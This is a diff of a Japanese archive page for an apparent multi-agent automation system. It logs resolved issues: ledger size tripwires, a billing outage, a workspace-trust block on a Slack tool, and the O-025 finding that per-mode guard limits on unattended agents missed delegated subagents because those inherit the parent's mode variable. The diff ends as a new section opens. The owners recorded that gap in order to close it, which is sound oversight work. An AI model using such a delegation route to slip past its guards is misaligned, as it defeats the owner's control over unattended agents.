@@ -19,7 +19,7 @@
 
   <h1 class="text-3xl font-bold mb-2">🗄️ アーカイブ（解決・完了）</h1>
   <p class="text-gray-600 mb-2">解決済み・様子見に落ち着いた提案（<span class="font-mono">O-NNN</span>）と、過去のサイクルログを保管します。<strong>最新レポートを「今知るべきこと」だけに保つ</strong>ための置き場（履歴は消さない）。現在対応中のものは<a href="index.html" class="text-blue-600 hover:underline">最新レポート</a>へ。</p>
-  <p class="text-sm text-gray-500 mb-8">最終更新：2026-06-26（Cycle 014・Cycle 013 のサイクルログを収容／往復切れ O-010/011/012 の再発を追記＝O-013 で継続追跡）</p>
+  <p class="text-sm text-gray-500 mb-8">最終更新：2026-08-10（Cycle 061 精密診断・<strong>Cycle 057 サイクルログを収容</strong>＝index 75KB＋当サイクル追記で 80KB tripwire 超過見込みのため）。前回＝2026-08-04（Cycle 060・Cycle 056 サイクルログを収容）。前回＝2026-08-03（Cycle 059 精密診断・<strong>O-025／O-018・O-019・O-023 の解決行と O-018 旧断片を🔔ボックスから収容</strong>＝器の規律）。前回＝2026-07-31（Cycle 057・<strong>Cycle 055 サイクルログを収容</strong>＝index 83.9KB＝80KB tripwire 超過のため）。前回＝2026-07-29（Cycle 054・<strong>O-022（07-27 の無人便全滅＝課金決済の不通）を✅解決として収容</strong>）。前回＝2026-07-28（Cycle 053・Cycle 050 サイクルログを収容＝index が 85KB＝80KB tripwire を超過したため）。Cycle 049 以前は既収容。Cycle 048 以前・O-015 解決カード・O-013 訂正カード・O-010/011/012 群は既収容。O-014/O-016/O-017/O-018/O-019/O-020/O-021/O-023/O-024/O-025/O-026/O-027/O-028/O-029/O-009 は最新レポートで継続</p>
 
   <!-- 3ページの案内 -->
   <div class="flex flex-wrap gap-3 mb-8 text-sm">
@@ -31,14 +31,117 @@
   <!-- ===== 解決・決着した提案 ===== -->
   <h2 class="text-2xl font-bold border-b-2 border-gray-300 pb-2 mb-6">解決・決着した提案（O-NNN）</h2>
 
+  <!-- 2026-08-03 Cycle 059（精密診断）で index 🔔ボックスから収容（削除でなく移設・本文は原文のまま） -->
+  <div class="border border-emerald-200 rounded-lg p-4 mb-4 bg-emerald-50/40">
+    <h4 class="font-bold mb-2 text-sm">✅ 2026-08-03 収容：O-025 解決行／O-018・O-019・O-023 解決行と O-018 旧ナラティブ断片（index 🔔ボックスより移設）</h4>
+    <ul class="space-y-3 text-sm text-gray-800">
+      <li><strong>✅ O-025（finance の機械ガード未対応）は本サイクルで解決＝クローズ</strong>：commit <span class="font-mono">621b434</span>（社長承認済み）で <span class="font-mono">AGENT_POLICIES</span> 表が新設され finance 行が実在。許可先3件が <span class="font-mono">rules/modes/finance.md</span> §書き込み許可「この3箇所のみ」と<strong>完全一致</strong>（統括が両方を実読して照合）。統括が O-025 で挙げた懸念は<strong>3点とも解消</strong>＝(a) <span class="font-mono">site/business/reviews/</span> は許可先の外＝partner 単独所有との衝突は物理的に起きない (b) comms 専用ハードコードが表に一般化＝「モード新設時に手順が抜ける」構造穴に対処 (c) 「委任経路には効かない（<span class="font-mono">MYAGENT_AGENT</span> は親のまま）」がガードの docstring と finance.md v0.2 の双方に明記＝効いたつもりの空振りが起きない。詳細と<strong>未確認1点</strong>は Cycle 056 のカード参照。</li>
+      <li><strong>✅ O-018／O-019／O-023 は本サイクルで解決＝<a href="archive.html" class="text-blue-600 hover:underline">アーカイブへ収容</a></strong>（社長承認・commit <span class="font-mono">2938c88</span>）。<strong>O-019 は統括の分析より1段深い真因</strong>＝単一エントリ <span class="font-mono">K-330</span> が気づき97件を配下に飲み込み<strong>169KB＝全体の54%</strong>（独立見出しに数えられずトリップワイヤも索引も素通り）＝「量」でなく<strong>追記の型の破れ</strong>でした。313KB→<strong>57.7KB</strong>（K-ID ロスゼロ・実測確認済み）。<strong>O-018</strong>＝partner.md v0.7 に掲示板 80KB トリップワイヤを明文化（<span class="underline">ただし発火確認は次サイクル</span>＝現在の partner 掲示板は 93.1KB でルール成立前の更新のまま）。<strong>O-023</strong>＝火曜 fallback を「対象週のウォーターマーク」方式へ（統括案の穴を Codex が補正）。あわせて共通ベース <span class="font-mono">rules/ledger-discipline.md</span> v0.1 が新設され partner/hp-loop/comms/hp-improve が結線されました。<strong>残った宿題は O-030・O-031 として上に起票</strong>。<em>旧カードの詳細はアーカイブ「解決・決着した提案」を参照。</em>（※収容時追記 2026-08-03：O-018 の発火確認は Cycle 059 で完了＝partner 掲示板 index 60KB へローテ済み・archive 376KB を実測）</li>
+      <li>（O-018 旧ナラティブ断片・indexでは開始タグ欠落のまま残置されていたもの）<strong>前回（07-24）</strong>＝O-021 と同じ自己修復が起きました。partner Cycle 069（07-23 17:39）が<strong>自力でローテを実施</strong>＝<span class="font-mono">ledger.md</span> の Cycle 066〜006 の61行を新設 <span class="font-mono">data/partner/ledger-archive.md</span> へ移設し <strong>280KB→137KB（−51%）</strong>。<strong>バイト検算済み</strong>（12,726＋143,316＋123,829＝279,871＝元サイズ一致・欠落ゼロ）・<strong>未完了 A-NNN は1件も移していない</strong>＝「履歴は消さず置き場を変える」原則どおり。台帳自身が残る主因（§3 約束追跡の行が毎サイクル `🆕 Cycle NNN` を追記し続ける）も特定し、07-24 朝礼で着手すると自己宣言。<strong>ただし新事実2件</strong>：①移設後<strong>3時間で 137→163.4KB（+26KB）</strong>＝1日で 100KB 級に戻る速度②<strong>掲示板 <span class="font-mono">site/business/partner/index.html</span> が 36.2→99.5KB＝hp-loop の 80KB tripwire を初超過</strong>（archive.html も 128.9KB。07-23 は反応tickが11本走った特異日＝Cycle 061→071 を1本にまとめた長大ナラティブが主因）。<strong>なぜ問題か（構造）</strong>＝<span class="font-mono">partner.md</span> は hp-loop の3層プロトコルを<strong>文章では流用</strong>しているのに、<strong>数値 tripwire（掲示板80KB／台帳100KB）を継承していません</strong>＝「守るべき閾値が無い」ので、実行はモードの自発性頼み（今回は自発的に回りましたが、常に回る保証がない）。<strong>ご判断（二択・不変）</strong>：①「着手OK」→有人セッションで <span class="font-mono">partner.md</span> に<strong>台帳と掲示板の両方</strong>の数値 tripwire を追記（O-021/O-019 と<strong>棚卸し1セッション一括が最効率</strong>）／②やらない→クローズ。<strong>効果</strong>：中〜高／<strong>工数</strong>：小（自己修復の実績があるため当初想定より軽い）。詳細な経緯は<a href="archive.html" class="text-blue-600 hover:underline">アーカイブ</a>参照。</li>
+      <li class="text-xs text-gray-500">（以下2件は index で <span class="font-mono">li hidden</span> のHTMLコメントとして残置されていた旧カード全文＝2026-08-03 Cycle 059 で本欄へ移設・原文のまま）</li>
+      <li hidden><!-- O-025 旧カード（✅解決・Cycle 056 で検証クローズ）：<strong>観察</strong>＝hanasaka-main から「finance モード新設（<span class="font-mono">fc527e7</span>・SYSTEM.md v0.3）の Codex レビューで見送った4件を O-NNN で追跡してほしい」と依頼（<span class="font-mono">M-20260728T202413</span>）。統括で実体を確認したところ、①<span class="font-mono">bin/guard-unattended-edits.py</span> に <strong>finance / financial の記述は0件</strong>（実読で確認）＝モード別の機械制限があるのは <span class="font-mono">comms</span> だけ（書込ホワイトリスト＋Bash 拒否）。<span class="font-mono">agent-tick.sh</span> に finance の dispatch は無く<strong>単独の無人起動はありません</strong>が、<span class="font-mono">rules/modes/partner.md</span> v0.6 は「明細レベルの調査は自分で潜らず <strong>finance サブエージェントへ委任が既定</strong>」と定めており、<strong>partner は無人で回ります</strong>（反応tick <span class="font-mono">dispatch "partner"</span>＋daily 朝礼＝07-27 の障害で朝礼便が落ちた記録が実在＝無人稼働の裏付け）。サブエージェントは親の環境変数を継承するため、<strong>無人 partner → finance 委任という経路は今日すでに存在します</strong>。<strong>なぜ問題か</strong>＝(a) 依頼文の「現状は有人セッション限定運用のため実害なし」は成り立たない (b) ただし<strong>最悪の穴は塞がっています</strong>＝ゲート対象（<span class="font-mono">SYSTEM.md</span>・<span class="font-mono">rules/**</span>・<span class="font-mono">.claude/commands/**</span>・settings・<span class="font-mono">from-president.md</span>）はフックが無人時に拒否するので、finance がルールを自己改変することはできません。残る露出は<strong>非ゲート領域（<span class="font-mono">data/</span>・<span class="font-mono">site/</span>）への Write と Bash（comms 以外は無制限）</strong>＝Codex が指摘した <span class="font-mono">reviews/</span>（partner 単独所有）との衝突リスクはまさにこの層です。<strong>設計上の注意（統括の追加観察）</strong>＝ガードは <span class="font-mono">MYAGENT_AGENT</span> でモードを判定しますが、委任時の値は親の <span class="font-mono">partner</span> のままです。<strong>＝「MYAGENT_AGENT=finance なら制限」と書いても委任経路には効きません</strong>（comms と同じ書き方をすると効いたつもりの空振りになる）。<strong>ご判断（二択）</strong>：①<strong>前倒しする</strong>＝次の有人セッションで機械ガードに finance 相当の書込スコープ（<span class="font-mono">data/financial/</span> ＋ <span class="font-mono">site/drafts/partner/</span> のみ許可・<span class="font-mono">reviews/</span> は不可）を入れる。実装方式は上記の理由で要検討（統括は設計しません）／②<strong>見送り継続</strong>＝当面は文章ルール＋ゲート対象の拒否で足りるとし、cron 搭載時に必須化（依頼元の当初案）。<strong>残り3件（②F-NNN 採番の flock 排他なし／③partner 側に F 台帳の再読ウォーターマークなし／④棚卸し表の Tailwind CDN 依存）は 🟢低・「次に finance／partner へ手を入れる改修に同乗」で追跡</strong>（単独着手しません）。<strong>効果</strong>：中（安全の穴・automation.md §3 系）／<strong>工数</strong>：小〜中／<strong>ステータス</strong>：⏳ Pending。 --></li>
+      <li hidden><!-- O-019 旧カード（✅解決・アーカイブ収容済み）<strong>前回（07-28 夜・Cycle 051）</strong>＝<span class="font-mono">skill-kaizen.md</span> <strong>255→268KB（+13KB・半日）</strong>＝system-health の⚠️最上位。<strong>07-28 未明時点</strong>＝<strong>171.9→255KB（+83KB/4日）</strong>。<strong>観察（07-24）</strong>＝<span class="font-mono">data/hp-improve/skill-kaizen.md</span> が 07-08 の棚卸しで 12KB に整理された直後から <strong>16日で 171.9KB</strong>（94→98→108→124→130→135.5→141→147→<strong>171.9KB</strong>＝直近 <strong>+24.9KB/日＝これまでの4倍速</strong>）。<strong>100KB 超過が7サイクル目</strong>。<strong>加速の中身（07-24 実読）</strong>＝1件の K エントリが数百字〜千字級の長文になっており（例：K-0723s は約1,000字の一段落）、件数でなく<strong>1件あたりの長さ</strong>が効いています＝下記②「1件1〜3行に圧縮」の書式上限が直接効く形。<strong>なぜ問題か</strong>＝この台帳にはサイズ上限ルールが無く、<strong>週次棚卸しだけが唯一のブレーキ</strong>。この勢い（+24.9KB/日）だと次の棚卸しを待たず 200KB を超え、棚卸しセッション自体が重くなる＋ルール昇格候補が埋もれる（444KB まで放置された前回事例の再演リスク）。全ループが書き込む共有台帳なので、書き手側の記録規律だけでは止まらない。<strong>推奨（二択）</strong>：①<strong>棚卸しを前倒しで実施</strong>（有人・社長と。学びの昇格＋台帳の整理。<strong>O-021/O-018 と同じ1セッションで一括が最効率</strong>）／②棚卸しは予定どおりとし、<span class="font-mono">skill-kaizen.md</span> 冒頭の記入ルールに「1件1〜3行に圧縮」等の書式上限を追記（要合意）。<strong>効果</strong>：中〜高／<strong>工数</strong>：①中（棚卸し1セッション）②小。 --></li>
+    </ul>
+  </div>
+
+  <!-- O-019 (resolved) -->
+  <div class="border border-emerald-200 rounded-lg p-4 mb-4 bg-emerald-50/40">
+    <div class="flex items-center justify-between mb-1">
+      <h4 class="font-bold">O-019：カイゼン台帳 <span class="font-mono">skill-kaizen.md</span> の肥大＝<strong>真因は「単一エントリが97件を飲み込む追記バグ」だった</strong>（313KB→57KB・構造修復）</h4>
+      <span class="text-xs font-bold text-white bg-emerald-600 px-2 py-0.5 rounded">✅ 解決（2026-07-29 Cycle 055・社長承認 commit 2938c88）</span>
+    </div>
+    <ul class="text-sm text-gray-700 space-y-1 list-disc list-inside">
+      <li><strong>起票時の観察（07-24〜07-28）</strong>：<span class="font-mono">data/hp-improve/skill-kaizen.md</span> が 07-08 の棚卸し直後の 12KB から <strong>171.9→255→268KB</strong>（閾値の268%）へ。統括は「週次棚卸しだけが唯一のブレーキ」と分析し、①棚卸し前倒し ②書式上限の追記、の二択を提示していた。</li>
+      <li><strong>実際の真因（有人セッションで判明・統括の分析より1段深かった）</strong>：単一エントリ <span class="font-mono">K-330</span> が 07-22〜07-29 の気づき<strong>97件を配下の箇条書きとして飲み込み、169KB＝全体の54%</strong>を占めていた。ぶら下げた記録は <span class="font-mono">### K-NNN</span> の独立見出しに数えられないため、<strong>トリップワイヤも索引も素通りする</strong>＝「量の問題」ではなく<strong>追記の型の破れ（構造バグ）</strong>だった。</li>
+      <li><strong>反映（社長承認・commit 2938c88）</strong>：①K-ID を復元して独立見出しへ再構成し、冷めた学びを <span class="font-mono">skill-kaizen-archive.md</span> へ原文無改変で退避＝<strong>313KB→57.7KB</strong>（archive 754KB・<strong>K-ID ロスゼロ</strong>）②<span class="font-mono">skill-kaizen.md</span> 冒頭に<strong>「⚠️ 追記の型」＝必ず <span class="font-mono">### K-NNN</span> の独立見出しで台帳末尾に足す・直前エントリにぶら下げない</strong>を明記（採番前の再読も規定）③<strong>100KB トリップワイヤ＋テーマ別索引</strong>を新設 ④書き手側にも同じ禁止を結線（<span class="font-mono">hp-improve.md</span> v0.3 Step 6）。</li>
+      <li><strong>統括の検証（本サイクル・実体で確認）</strong>：<span class="font-mono">skill-kaizen.md</span> 57,688B（56.3KB＝閾値内）・<span class="font-mono">skill-kaizen-archive.md</span> 753,973B・本体の <span class="font-mono">K-330</span> 出現1件（暴走エントリは解消）・K-ID ユニーク 本体50／archive 454。冒頭に「⚠️ 追記の型」と「100KB トリップワイヤ」の両方が実在。</li>
+      <li><strong>学び（統括として残す）</strong>：<strong>サイズ警報は「量」を教えるが「構造」は教えない</strong>。7サイクル連続で KB を報告し続けたが、単一エントリが54%を占めるという分布は見ていなかった＝<strong>閾値超過を起票するときは「何が太らせているか」の内訳（最大エントリの占有率）まで1回は見る</strong>のが正しい。本件は次サイクル以降の統括の点検手順に反映する（下記 Cycle 055 の自己改善）。</li>
+      <li><strong>関連</strong>：O-018・O-021（同じ「器の規律」ファミリ）・新設の共通ベース <span class="font-mono">rules/ledger-discipline.md</span> v0.1</li>
+    </ul>
+  </div>
+
+  <!-- O-018 (resolved) -->
+  <div class="border border-emerald-200 rounded-lg p-4 mb-4 bg-emerald-50/40">
+    <div class="flex items-center justify-between mb-1">
+      <h4 class="font-bold">O-018：経営パートナーの台帳＋掲示板のローテ規律＝<strong>掲示板 80KB トリップワイヤを明文化</strong>（partner.md v0.7）</h4>
+      <span class="text-xs font-bold text-white bg-emerald-600 px-2 py-0.5 rounded">✅ 解決（2026-07-29 Cycle 055・社長承認 commit 2938c88）</span>
+    </div>
+    <ul class="text-sm text-gray-700 space-y-1 list-disc list-inside">
+      <li><strong>起票時の観察</strong>：partner は台帳 <span class="font-mono">data/partner/ledger.md</span> に 70KB の数値トリップワイヤを持つ一方、<strong>掲示板 <span class="font-mono">site/business/partner/index.html</span> には数値の閾値が無く「気づいたら退避」に依存</strong>していた（自己ローテは3回とも自発的に成功したが、常に回る保証が無い構造）。</li>
+      <li><strong>反映（社長承認）</strong>：<span class="font-mono">rules/modes/partner.md</span> v0.7 Step 5 に<strong>「index.html が 80KB を超えていたら当サイクルで必ず旧サイクルを archive へ退避してから終える（スキップ不可）」</strong>を明記。あわせて器の規律の原則を共通ベース <span class="font-mono">rules/ledger-discipline.md</span> へ集約し、partner は<strong>「台帳70KB の上書きだけを持つ」</strong>形へ。</li>
+      <li><strong>統括の検証（本サイクル）</strong>：<span class="font-mono">partner.md</span> L178 に該当文言が実在（v0.7 changelog も一致）。<strong>ただし実測は「これから効く」段階</strong>＝台帳 69,983B（68.3KB＝閾値内・✅）／<strong>掲示板 95,311B（93.1KB）＝新設の 80KB を超過中</strong>（掲示板の最終更新 10:29 は<strong>ルール成立 11:29 より前</strong>＝ルール未適用のまま。次の partner サイクルで自動退避されるはず）。<strong>＝ルールが実際に発火するかの確認は次サイクルへ持ち越し</strong>（発火しなければ O-018 を再起票する）。</li>
+      <li><strong>関連</strong>：O-019・O-021・<span class="font-mono">rules/ledger-discipline.md</span> v0.1（掲示板80KB 既定の出典）</li>
+    </ul>
+  </div>
+
+  <!-- O-023 (resolved) -->
+  <div class="border border-emerald-200 rounded-lg p-4 mb-4 bg-emerald-50/40">
+    <div class="flex items-center justify-between mb-1">
+      <h4 class="font-bold">O-023：火曜 fallback の判定文言の穴＝<strong>「対象週のウォーターマーク」方式へ修正</strong>（overseer.md v0.9）</h4>
+      <span class="text-xs font-bold text-white bg-emerald-600 px-2 py-0.5 rounded">✅ 解決（2026-07-29 Cycle 055・社長承認 commit 2938c88）</span>
+    </div>
+    <ul class="text-sm text-gray-700 space-y-1 list-disc list-inside">
+      <li><strong>起票時の観察</strong>：「最新の精密診断が<strong>直近6日以内</strong>なら実施済み」という判定は、月曜便が落ちても先週の診断を今週の成功と誤認しうる＝<strong>保険が必要なときに限って空振りする</strong>（07-28 は設計意図を優先して実害を回避）。</li>
+      <li><strong>反映（社長承認・Codex レビュー込み）</strong>：<span class="font-mono">rules/modes/overseer.md</span> v0.9 で判定を<strong>「今週（月曜起算）に精密診断が既に1回でもあるか＝対象週をウォーターマークにする」</strong>へ変更。統括が当初出した「直近の月曜 00:00 以降」案（＝実行日基準）は Codex 指摘で穴が判明＝<strong>火曜 fallback が肩代わりで走ると最新診断日が火曜になり、同じ火曜の再実行で毎回フル診断してしまう</strong>。"対象週"で見れば週内に1本あれば足り、逐次再実行にも強い。</li>
+      <li><strong>統括の検証（本サイクル）</strong>：<span class="font-mono">overseer.md</span> は v0.9・運用モード表と changelog の両方に週ウォーターマークの記述が実在。<strong>「固定日数窓・前日ピンポイントは使わない」という禁止形まで明記</strong>されており、同種の穴の再発防止になっている。</li>
+      <li><strong>学び（統括として残す）</strong>：<strong>自分の判定ロジックの修正案は、自分では検証しきれない</strong>（今回、統括案は「肩代わり後の再実行」というケースを見落とし、外部レビューが拾った）。時刻・日付の判定を提案するときは<strong>「その処理自身が実行された後の状態」で再評価する</strong>のを型にする。</li>
+      <li><strong>関連</strong>：O-022（月曜便が落ちた実例）・3枚目の保険＝軽い巡回の7日超切替</li>
+    </ul>
+  </div>
+
+  <!-- O-022 (resolved) -->
+  <div class="border border-emerald-200 rounded-lg p-4 mb-4 bg-emerald-50/40">
+    <div class="flex items-center justify-between mb-1">
+      <h4 class="font-bold">O-022：07-26 23:00〜07-27 07:00 に無人便12本が全滅＝<strong>原因は Anthropic の課金決済不通によるサブスクアクセス一時無効化</strong></h4>
+      <span class="text-xs font-bold text-white bg-emerald-600 px-2 py-0.5 rounded">✅ 解決（2026-07-29 Cycle 054・社長ご確認済み）</span>
+    </div>
+    <ul class="text-sm text-gray-700 space-y-1 list-disc list-inside">
+      <li><strong>観察（起票時・Cycle 050／2026-07-28 精密診断）</strong>：07-26 23:00〜07-27 07:00 に無人便12本（memo-intake・overseer 精密診断・hp-loop×6・blog-loop・blog-write・blog-improve・partner 朝礼）が<strong>全て起動3〜5秒で異常終了</strong>。stderr は全便同一＝<span class="font-mono">"Your organization has disabled Claude subscription access for Claude Code · Use an Anthropic API key instead, or ask your admin to enable access"</span>。<strong>07-27 12:06 の反応tickから自然回復</strong>。VPS 側の設定・コード変更なし（外部起因）。障害中も純シェル警報（Slack 発報）と <span class="font-mono">failures.jsonl</span> 記録は機能した。</li>
+      <li><strong>原因の確定（2026-07-29・hanasaka-main 経由の社長ご確認）</strong>：<strong>Anthropic の課金（クレジットカード決済）が通らず、サブスクアクセスが一時的に無効化された</strong>もの。統括が観測した「組織側でサブスクアクセスが無効化」の<strong>上流が課金</strong>だったという整合する説明。07-27 昼に決済が回復し自然復旧。</li>
+      <li><strong>結末（ご判断）</strong>：<strong>決済は社長側で管理される方針＝システム側の恒久対処は不要</strong>。欠落した週次 blog 便（今週分）は<strong>次回 08-03 の定期便を待つ＝手動リカバリはしない</strong>。</li>
+      <li><strong>切り分け（混同注意）</strong>：<span class="font-mono">web-hanasaka</span> の未受領は<strong>07-22 開始＝カード停止（07-27）の5日前から</strong>、<span class="font-mono">fujisaka-dev</span> は 6/21 から＝<strong>この2件は本件とは別原因</strong>（＝O-027 の拠点PC未起動）。<strong>無人便12本の全滅だけがカード起因</strong>。</li>
+      <li><strong>統括が引き継ぐ観測（クローズ後も継続）</strong>：認証・課金レイヤ起因の全便停止は<strong>2回目</strong>（1回目＝07-23 の認証セッション切れ・partner K-348）。<strong>3回目で「単一障害点の対策（API キー fallback 等）」を設計課題として起票</strong>する方針は維持（それまでは監視のみ）。</li>
+      <li><strong>関連</strong>：受信 <span class="font-mono">M-20260729T102219-hanasaka-main</span>／<span class="font-mono">data/overseer/failures.jsonl</span>（07-26〜07-27 の <span class="font-mono">-fail(1)</span> 13件）／partner K-348・blog-loop K-365／O-027（別原因の滞留）</li>
+    </ul>
+  </div>
+
+  <!-- O-015 (resolved) -->
+  <div class="border border-emerald-200 rounded-lg p-4 mb-4 bg-emerald-50/40">
+    <div class="flex items-center justify-between mb-1">
+      <h4 class="font-bold">O-015：無人tickで <span class="font-mono">slack-poll.py</span> が一律ハード拒否（双方向Slackの復路断）＝<strong>ワークスペース未トラストが真因・解消</strong></h4>
+      <span class="text-xs font-bold text-white bg-emerald-600 px-2 py-0.5 rounded">✅ 解決（2026-06-27 Cycle 022 確認）</span>
+    </div>
+    <ul class="text-sm text-gray-700 space-y-1 list-disc list-inside">
+      <li><strong>症状（Cycle 015〜021）</strong>：無人 <span class="font-mono">claude -p</span> 配下で <span class="font-mono">slack-poll.py</span> の <span class="font-mono">fetch/post/reply/done</span> が「requires approval」で実行不可。社長の Slack 返信が <span class="font-mono">new/</span>(<span class="font-mono">to: overseer</span>)に滞留し、反応tickが同じ通で空回り（<span class="font-mono">overseer:3:handle(3)</span>）。</li>
+      <li><strong>真因（Cycle 021 特定）</strong>：<span class="font-mono">tick.log</span> の <code>Ignoring 45 permissions.allow entries … this workspace has not been trusted</code>＝ワークスペース未トラストで許可リスト45件が丸ごと無視されていた（Cycle 020 までの「サンドボックス/egress」推測 K-099 を上書き訂正）。恒久対応＝トラスト承認1つ（<span class="font-mono">hasTrustDialogAccepted: true</span> もしくは対話起動での承認）。</li>
+      <li><strong>解消の確認（Cycle 022）</strong>：無人tick（2026-06-27 00:44〜01:00・約8本）で <span class="font-mono">slack-poll.py fetch</span> が <code>新着なし</code> で正常完走・<span class="font-mono">workspace not trusted</span> 警告は消失・全エージェント <span class="font-mono">0:idle</span>・<span class="font-mono">status=ok</span>・反応tickの空回りも停止。＝双方向Slackの復路が無人でも通る状態に復旧。</li>
+      <li><strong>関連</strong>：<span class="font-mono">data/overseer/tick.log</span>／<span class="font-mono">~/.claude.json</span>（リポジトリ外・社長領域）／K-099→K-100／Cycle 019〜022</li>
+    </ul>
+  </div>
+
+  <!-- O-013 (corrected) -->
+  <div class="border border-gray-300 rounded-lg p-5 mb-4 bg-white">
+    <div class="flex items-center justify-between mb-2">
+      <h4 class="font-bold">O-013：dev→loop の「往復切れ／孤児」は<strong>当方の事実誤認</strong>＝<span class="font-mono">to: hp-loop</span> が正しい投函先</h4>
+      <span class="text-xs font-bold text-white bg-emerald-600 px-2 py-0.5 rounded">✅ 訂正・決着</span>
+    </div>
+    <ul class="text-sm space-y-1 text-gray-700">
+      <li><strong>開発エージェントの確定仕様（社長転送・2026-06-26 11:55）</strong>：送信先(<span class="font-mono">--to</span>)と送信元(<span class="font-mono">from</span>)は別フィールド。dev の投函窓口は<strong>サーバ上 <span class="font-mono">hp-loop</span> で登録</strong>され、ループ名（ack の <span class="font-mono">from</span>）が <span class="font-mono">hp-loop-yoshida</span>。<span class="font-mono">--to hp-loop-yoshida</span> は<strong>送信先未登録のため <span class="font-mono">unknown_recipient</span> で弾かれる</strong>（dev 側 <span class="font-mono">project-config.md:21</span> の確定仕様）。＝「<span class="font-mono">to: hp-loop</span> 宛で届く」と「<span class="font-mono">hp-loop-yoshida</span> へは送れない」は両立し矛盾しない。</li>
+      <li><strong>訂正の要点</strong>：Cycle 014 で🔴起票した「往復切れ再発／孤児化」、および前段の O-007・O-010/011/012 が拠った「<span class="font-mono">to: hp-loop</span>＝旧称・宛名ズレ」という前提は<strong>宛名モデルの誤読</strong>だった。<span class="font-mono">to: hp-loop</span> は正規の投函先。dispatcher の反応tickは <span class="font-mono">to: hp-loop-yoshida</span> を厳密一致で見るため <span class="font-mono">to: hp-loop</span> では発火しないが、<strong>日次の yoshida 強制起動（02:30）が確実に拾う</strong>（実際 02:37 に再監査 ack 生成）。＝「約1日滞留」は<strong>日次周期の正常な待ち</strong>であり停滞ではない。実害なし。</li>
+      <li><strong>残る食い違い（→ O-014）</strong>：<span class="font-mono">cur/</span> に <span class="font-mono">to: hp-loop-yoshida</span> 宛の消化済み9通が残り、仕様（<span class="font-mono">hp-loop-yoshida</span> は送信先未登録）と矛盾する。推測：過去サイクルの応急再投函（local-send）の痕跡。確証はないため断定せず、宛名モデルの確定確認は最新レポートの <strong>O-014</strong> に残す。</li>
+      <li><strong>社長判断</strong>：「<span class="font-mono">hp-loop-yoshida</span> 宛に間違いなく送っていると確認した。一旦これを映して、再発時に再調査」＋開発エージェントの確定仕様の転送で<strong>決着</strong>。統括の「旧称 <span class="font-mono">to: hp-loop</span> 孤児」シグナルは誤検知の元のため <strong>O-014（SYSTEM.md 訂正）</strong>を起票。</li>
+      <li><strong>関連</strong>：受信 <span class="font-mono">M-20260626T115514-president</span>／<span class="font-mono">bin/agent-tick.sh</span> L121-156・L171／K-097／下記 O-010/011/012・O-007（同じ前提で起票した過去群）</li>
+    </ul>
+  </div>
+
   <!-- O-010 / O-011 / O-012 -->
   <div class="border border-gray-300 rounded-lg p-5 mb-4 bg-white">
     <div class="flex items-center justify-between mb-2">
       <h4 class="font-bold">O-010 / O-011 / O-012：dev↔loop の往復切れ（宛名移行の系統的未完）＝3サイトとも閉路化</h4>
-      <span class="text-xs font-bold text-white bg-amber-500 px-2 py-0.5 rounded">⚠️ 再発（Cycle 014・→O-013）</span>
+      <span class="text-xs font-bold text-white bg-emerald-600 px-2 py-0.5 rounded">✅ 決着（前提を O-013 で訂正）</span>
     </div>
-    <p class="text-xs text-amber-700 mb-2">⚠️ <strong>2026-06-26 追記</strong>：Cycle 012 で「解決」としたが <strong>Cycle 014（2026-06-26）で再発</strong>。yoshida-dev の実装報告（R-Y06/R-Y15・本番デプロイ済）が再び旧称 <span class="font-mono">to: hp-loop</span> 宛で <span class="font-mono">new/</span> に孤児化。＝Cycle 012 の「解決」は症状（孤児ゼロの観測）であって根本（外部 dev の送信先同期）は未確立だった（K-040 の再々確認）。継続追跡は最新レポートの <strong>O-013</strong> へ。</p>
-    <p class="text-xs text-emerald-700 mb-2">✅ <strong>2026-06-26 続報（Cycle 015）</strong>：O-013 は<strong>実害なく解決</strong>。当該報告は本日02:37 に <span class="font-mono">hp-loop-yoshida</span> が拾い本番GET再監査まで完了済み（孤児の原本は <span class="font-mono">cur/</span> へ処理済み）。社長も「再発時に再調査」で合意し、恒久策（送信側統一 or 受信側フォールバック）は<strong>保留</strong>。統括は旧称 <span class="font-mono">to: hp-loop</span> 孤児の<strong>定点監視を継続</strong>し、次の再発時に根本切り分けへ踏み込む。</p>
+    <p class="text-xs text-emerald-700 mb-2">✅ <strong>2026-06-26 訂正（Cycle 017）</strong>：本群が拠った「<span class="font-mono">to: hp-loop</span>＝旧称・宛名ズレ／孤児」という前提は、開発エージェントの確定仕様により<strong>誤読</strong>と判明した（<span class="font-mono">to: hp-loop</span> が正しい投函先・<span class="font-mono">hp-loop-yoshida</span> は送信先未登録）。＝当時「滞留」と見えたものの多くは<strong>日次周期の正常な待ち</strong>だった可能性が高い。詳細・訂正の経緯は上の <strong>O-013</strong> カード、恒久のシグナル訂正は最新レポート <strong>O-014</strong> を参照。履歴は消さず原文を残す。</p>
+    <p class="text-xs text-gray-500 mb-2">（以下は当時の記録。前提誤読を含むため上記訂正と併せて読むこと。）</p>
     <ul class="text-sm space-y-1 text-gray-700">
       <li><strong>経緯</strong>：Phase3 のマルチサイト化に伴い宛名を <span class="font-mono">hp-loop</span>→<span class="font-mono">hp-loop-&lt;site&gt;</span> へ移行した際、稼働中の各 dev（拠点PC）の送信先同期が遅れ、実装報告が旧称 <span class="font-mono">to: hp-loop</span> 宛で dispatcher に拾われず孤児化した（O-007→O-011→O-012 と症状を追い、Cycle 011 で「系統的未完」と名指し）。outbound 片道（loop→dev の受け手不在）を O-010 で並行追跡。</li>
       <li><strong>結末（Cycle 012・2026-06-24 実体確認）</strong>：旧称宛 inbound は <span class="font-mono">new/</span> から消失（孤児ゼロ）。<span class="font-mono">cur/</span> に <span class="font-mono">to: hp-loop-yoshida</span> 消化6通が出現し、<strong>web-hanasaka(13)／yoshida-dev(9)／fujisaka-dev(3) の3 dev すべて</strong>の報告が正規宛で届き処理されている。<strong>fujisaka-dev も 6/22 に稼働確認</strong>（O-010 の「未確認」を解消）。＝「提案→実装→報告→再監査」の戻り経路が3サイトとも機能。</li>
@@ -115,6 +218,721 @@
 
   <!-- ===== 過去サイクルログ ===== -->
   <h2 class="text-2xl font-bold border-b-2 border-gray-300 pb-2 mb-6 mt-12">過去サイクルログ</h2>
+
+  <!-- ===== Cycle 061（2026-08-12 Cycle 062 で index から収容・当サイクル追記で index 87KB＝80KB tripwire 超過のため／本文改変なし） ===== -->
+  <section class="mb-10">
+    <h3 class="text-xl font-bold mb-1">Cycle 061 — 2026-08-10 未明（<strong>精密診断</strong>・月曜 1:00 cron・<strong>基盤は対策後最良＝故障6日ゼロ。🆕O-038（fujisaka 掲示板の器の規律 不発）＋O-035 を🔴へ（skill-kaizen 225KB）＋O-036 を🟡へ（done 空振りの偽陽性）</strong>）</h3>
